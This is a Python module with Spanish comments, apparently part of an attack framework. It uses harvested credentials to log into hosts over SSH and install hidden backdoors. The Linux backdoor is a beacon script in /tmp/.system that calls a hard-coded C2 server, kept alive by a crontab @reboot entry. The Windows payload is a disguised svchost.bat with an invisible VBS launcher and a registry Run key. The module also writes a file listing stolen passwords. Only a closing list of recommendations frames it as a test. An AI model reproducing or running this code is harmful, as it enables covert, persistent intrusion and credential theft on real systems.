#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Módulo 7: Backdoor & Persistence Manager
Instala backdoors y mantiene persistencia en hosts comprometidos
Incluye payload especializado para Windows
"""

import json
import os
import time
import base64
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path
import paramiko

class BackdoorManager:
    """Clase para gestionar backdoors y persistencia"""
    
    def __init__(self, output_dir: str = "reports"):
        """
        Inicializa el módulo de backdoors
        
        Args:
            output_dir: Directorio para guardar informes
        """
        self.output_dir = output_dir
        self.backdoor_dir = "loot/backdoors"
        self.creds_file = "loot/credentials/credentials_found.json"
        
        # Crear directorios
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        Path(self.backdoor_dir).mkdir(parents=True, exist_ok=True)
        
        # Cargar configuración
        self.config = self._load_config()
        
        # Estructura del informe
        self.report = {
            "module": "Backdoor & Persistence Manager",
            "timestamp": datetime.now().isoformat(),
            "start_time": datetime.now().isoformat(),
            "end_time": None,
            "duration_seconds": 0,
            "status": "IN_PROGRESS",
            "hosts_processed": [],
            "backdoors_installed": [],
            "persistence_mechanisms": [],
            "access_instructions": [],
            "statistics": {
                "total_hosts_attempted": 0,
                "successful_installations": 0,
                "failed_installations": 0
            },
            "recommendations": []
        }
    
    def _load_config(self) -> Dict:
        """Carga configuración desde config.env"""
        config = {
            'c2_server_url': 'http://184.107.168.100:8000',
            'c2_identifier': 'EUROPEAN',
            'attack_delay': 0.5
        }
        
        try:
            if os.path.exists('config.env'):
                with open('config.env', 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            if 'C2_SERVER_URL' in key:
                                config['c2_server_url'] = value
                            elif 'C2_IDENTIFIER' in key:
                                config['c2_identifier'] = value
                            elif 'ATTACK_DELAY' in key:
                                config['attack_delay'] = float(value)
        except Exception as e:
            print(f"[!] No se pudo cargar config.env: {e}")
        
        return config
    
    def _save_report(self):
        """Guarda el informe"""
        try:
            output_file = os.path.join(self.output_dir, "informe_backdoor_persistence.json")
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.report, f, indent=4, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error guardando informe: {e}")
    
    def run_backdoor_installation(self) -> Dict:
        """Ejecuta la instalación de backdoors en hosts comprometidos"""
        print(f"\n{'='*70}")
        print(f"  MÓDULO 7: BACKDOOR & PERSISTENCE")
        print(f"{'='*70}\n")
        
        start_time = time.time()
        
        try:
            # Cargar credenciales comprometidas
            credentials = self._load_credentials()
            
            if not credentials:
                print(f"[!] No hay credenciales comprometidas disponibles")
                print(f"[!] Ejecuta primero el Módulo 6: Credential Harvesting")
                self.report['status'] = 'SKIPPED'
                return self.report
            
            print(f"[*] Credenciales cargadas: {len(credentials)}")
            print(f"[*] C2 Server: {self.config['c2_server_url']}")
            print(f"[*] Identificador: {self.config['c2_identifier']}\n")
            
            # Procesar cada host comprometido
            for cred in credentials:
                host_ip = cred['host']
                service = cred['service']
                
                print(f"[*] Procesando {host_ip} ({service})...")
                
                self.report['statistics']['total_hosts_attempted'] += 1
                
                # Determinar tipo de backdoor según el servicio
                if service.upper() == 'SSH':
                    success = self._install_linux_backdoor(cred)
                elif service.upper() in ['SMB', 'RDP']:
                    success = self._install_windows_backdoor(cred)
                else:
                    print(f"    [!] Servicio no soportado para backdoor: {service}")
                    continue
                
                if success:
                    self.report['statistics']['successful_installations'] += 1
                else:
                    self.report['statistics']['failed_installations'] += 1
                
                self._save_report()
                time.sleep(self.config['attack_delay'])
            
            # Generar instrucciones de acceso
            self._generate_access_instructions()
            
            # Estado final
            if self.report['statistics']['successful_installations'] > 0:
                self.report['status'] = 'SUCCESS'
                print(f"\n[✓✓✓] BACKDOORS INSTALADOS EXITOSAMENTE")
            else:
                self.report['status'] = 'FAILED'
                print(f"\n[!] No se pudieron instalar backdoors")
        
        except KeyboardInterrupt:
            print(f"\n[!] Proceso interrumpido")
            self.report['status'] = 'INTERRUPTED'
        
        except Exception as e:
            print(f"\n[!] Error: {e}")
            self.report['status'] = 'ERROR'
            import traceback
            traceback.print_exc()
        
        finally:
            end_time = time.time()
            self.report['end_time'] = datetime.now().isoformat()
            self.report['duration_seconds'] = round(end_time - start_time, 2)
            
            self._add_recommendations()
            self._save_report()
            
            print(f"\n{'='*70}")
            print(f"  RESUMEN")
            print(f"{'='*70}")
            print(f"Hosts procesados: {self.report['statistics']['total_hosts_attempted']}")
            print(f"Backdoors exitosos: {self.report['statistics']['successful_installations']}")
            print(f"Fallos: {self.report['statistics']['failed_installations']}")
            print(f"Duración: {self.report['duration_seconds']} segundos")
            print(f"Informe: {self.output_dir}/informe_backdoor_persistence.json")
            print(f"{'='*70}\n")
        
        return self.report
    
    def _load_credentials(self) -> List[Dict]:
        """Carga credenciales comprometidas"""
        try:
            with open(self.creds_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    
    def _install_linux_backdoor(self, cred: Dict) -> bool:
        """Instala backdoor en sistema Linux via SSH"""
        host_ip = cred['host']
        username = cred['username']
        password = cred['password']
        
        print(f"    [*] Instalando backdoor Linux en {host_ip}...")
        
        try:
            # Conectar via SSH
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(
                host_ip,
                port=cred.get('port', 22),
                username=username,
                password=password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            
            # Crear script de persistencia
            backdoor_script = f"""#!/bin/bash
# Backdoor persistence script
while true; do
    IP=$(curl -s https://api.ipify.org 2>/dev/null || echo "unknown")
    curl -s "{self.config['c2_server_url']}/?ip={self.config['c2_identifier']}_$IP" >/dev/null 2>&1
    sleep 60
done
"""
            
            # Subir y ejecutar el script
            commands = [
                'mkdir -p /tmp/.system 2>/dev/null',
                f'cat > /tmp/.system/svc.sh << "EOF"\n{backdoor_script}\nEOF',
                'chmod +x /tmp/.system/svc.sh',
                'nohup /tmp/.system/svc.sh >/dev/null 2>&1 &',
                # Agregar a crontab para persistencia
                '(crontab -l 2>/dev/null; echo "@reboot /tmp/.system/svc.sh >/dev/null 2>&1") | crontab - 2>/dev/null',
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = client.exec_command(cmd)
                stdout.read()
            
            print(f"    [✓✓✓] Backdoor Linux instalado exitosamente")
            
            backdoor_info = {
                "host": host_ip,
                "type": "Linux SSH Backdoor",
                "service": "SSH",
                "username": username,
                "password": password,
                "port": cred.get('port', 22),
                "persistence": "crontab + background process",
                "c2_reporting": True,
                "timestamp": datetime.now().isoformat()
            }
            
            self.report['backdoors_installed'].append(backdoor_info)
            self.report['hosts_processed'].append(host_ip)
            
            client.close()
            return True
        
        except Exception as e:
            print(f"    [!] Error instalando backdoor Linux: {e}")
            return False
    
    def _install_windows_backdoor(self, cred: Dict) -> bool:
        """Instala backdoor en sistema Windows"""
        host_ip = cred['host']
        username = cred['username']
        password = cred['password']
        
        print(f"    [*] Instalando backdoor Windows en {host_ip}...")
        
        try:
            # Intentar conexión SMB/WMI para ejecutar comandos
            # Primero intentamos con SSH si está disponible (ej: OpenSSH en Windows)
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                client.connect(
                    host_ip,
                    port=22,
                    username=username,
                    password=password,
                    timeout=10,
                    allow_agent=False,
                    look_for_keys=False
                )
                
                # Generar payload de Windows
                windows_payload = self._generate_windows_payload()
                
                # Ejecutar el payload
                stdin, stdout, stderr = client.exec_command(f'cmd.exe /c {windows_payload}')
                result = stdout.read().decode('utf-8', errors='ignore')
                
                if 'SUCCESS' in result:
                    print(f"    [✓✓✓] Backdoor Windows instalado exitosamente")
                    
                    backdoor_info = {
                        "host": host_ip,
                        "type": "Windows Persistence Backdoor",
                        "service": "SSH/CMD",
                        "username": username,
                        "password": password,
                        "persistence": "Registry Run Key + VBS Invisible",
                        "c2_reporting": True,
                        "payload": "IP reporting via HTTP",
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    self.report['backdoors_installed'].append(backdoor_info)
                    self.report['hosts_processed'].append(host_ip)
                    
                    client.close()
                    return True
                else:
                    print(f"    [!] Payload ejecutado pero sin confirmación de éxito")
                    client.close()
                    return False
            
            except Exception as e:
                print(f"    [!] No se pudo conectar via SSH a Windows: {e}")
                
                # Intentar via WMI/PSEXEC (requiere impacket)
                print(f"    [*] Intentando via WMI...")
                return self._install_windows_via_wmi(cred)
        
        except Exception as e:
            print(f"    [!] Error instalando backdoor Windows: {e}")
            return False
    
    def _generate_windows_payload(self) -> str:
        """
        Genera el payload de Windows completo con persistencia
        Este es el comando malicioso proporcionado por el usuario
        """
        c2_url = self.config['c2_server_url']
        identifier = self.config['c2_identifier']
        
        # Comando completo de una línea
        payload = f'''@echo off && echo @echo off > "%temp%\\svchost.bat" && echo setlocal enabledelayedexpansion >> "%temp%\\svchost.bat" && echo :inicio >> "%temp%\\svchost.bat" && echo curl -s https://api.ipify.org ^> "%temp%\\ip.txt" >> "%temp%\\svchost.bat" && echo set /p IP=^<"%temp%\\ip.txt" >> "%temp%\\svchost.bat" && echo curl -s "{c2_url}/?ip={identifier}_!IP!" ^>nul >> "%temp%\\svchost.bat" && echo ping 127.0.0.1 -n 61 ^>nul >> "%temp%\\svchost.bat" && echo goto inicio >> "%temp%\\svchost.bat" && reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PruebaMardita" /t REG_SZ /d "wscript.exe \\"%temp%\\invisible.vbs\\"" /f && echo Set WshShell = CreateObject("WScript.Shell"^) > "%temp%\\invisible.vbs" && echo WshShell.Run "cmd /c %temp%\\svchost.bat", 0, False >> "%temp%\\invisible.vbs" && wscript "%temp%\\invisible.vbs" && echo SUCCESS: Persistencia activa - Ejecuta cada 1 minuto'''
        
        return payload
    
    def _install_windows_via_wmi(self, cred: Dict) -> bool:
        """Instala backdoor en Windows via WMI/PSEXEC"""
        # Esta función requeriría impacket y sería más compleja
        # Por ahora retornamos False
        print(f"    [!] WMI/PSEXEC no implementado aún")
        return False
    
    def _generate_access_instructions(self):
        """Genera instrucciones de acceso a los backdoors"""
        instructions_file = os.path.join(self.backdoor_dir, "access_instructions.txt")
        
        try:
            with open(instructions_file, 'w', encoding='utf-8') as f:
                f.write("="*70 + "\n")
                f.write("  INSTRUCCIONES DE ACCESO A BACKDOORS\n")
                f.write("="*70 + "\n\n")
                f.write(f"Fecha de generación: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"C2 Server: {self.config['c2_server_url']}\n")
                f.write(f"Identificador: {self.config['c2_identifier']}\n\n")
                f.write("="*70 + "\n\n")
                
                for idx, backdoor in enumerate(self.report['backdoors_installed'], 1):
                    f.write(f"BACKDOOR #{idx}\n")
                    f.write("-"*70 + "\n")
                    f.write(f"Host: {backdoor['host']}\n")
                    f.write(f"Tipo: {backdoor['type']}\n")
                    f.write(f"Servicio: {backdoor['service']}\n")
                    f.write(f"Usuario: {backdoor['username']}\n")
                    f.write(f"Contraseña: {backdoor['password']}\n")
                    
                    if 'port' in backdoor:
                        f.write(f"Puerto: {backdoor['port']}\n")
                    
                    f.write(f"Persistencia: {backdoor['persistence']}\n")
                    f.write(f"Reportando a C2: {'Sí' if backdoor.get('c2_reporting') else 'No'}\n")
                    f.write(f"Instalado: {backdoor['timestamp']}\n")
                    
                    # Comandos de acceso
                    f.write("\nCOMO ACCEDER:\n")
                    
                    if backdoor['type'] == 'Linux SSH Backdoor':
                        f.write(f"  ssh {backdoor['username']}@{backdoor['host']}\n")
                        f.write(f"  Contraseña: {backdoor['password']}\n")
                    elif 'Windows' in backdoor['type']:
                        f.write(f"  El backdoor reporta la IP pública al C2 server cada 60 segundos\n")
                        f.write(f"  Monitorear: {self.config['c2_server_url']}\n")
                        f.write(f"  Buscar IPs con prefijo: {self.config['c2_identifier']}_\n")
                    
                    f.write("\n" + "="*70 + "\n\n")
                
                f.write("\nNOTAS IMPORTANTES:\n")
                f.write("-"*70 + "\n")
                f.write("1. Los backdoors están configurados para persistir después de reinicios\n")
                f.write("2. Monitorea el C2 server para ver las IPs comprometidas reportando\n")
                f.write("3. Los backdoors Windows se ejecutan de forma invisible\n")
                f.write("4. Para remover: eliminar entradas de registry y procesos en background\n")
                f.write("\n" + "="*70 + "\n")
            
            print(f"\n[✓] Instrucciones guardadas en: {instructions_file}")
            self.report['access_instructions'].append(instructions_file)
        
        except Exception as e:
            print(f"[!] Error generando instrucciones: {e}")
    
    def _add_recommendations(self):
        """Agrega recomendaciones"""
        recommendations = [
            "CRÍTICO: Los backdoors instalados deben ser removidos después de la prueba",
            "Documentar todos los backdoors para remediación completa",
            "Cambiar todas las credenciales comprometidas inmediatamente",
            "Revisar logs de sistema en busca de actividad sospechosa",
            "Implementar EDR/XDR para detectar persistencia maliciosa",
            "Configurar alertas para conexiones salientes no autorizadas",
            "Implementar application whitelisting",
            "Monitorear registry keys de autorun en Windows",
            "Implementar file integrity monitoring",
            "Realizar análisis forense completo de sistemas comprometidos"
        ]
        
        self.report['recommendations'] = recommendations

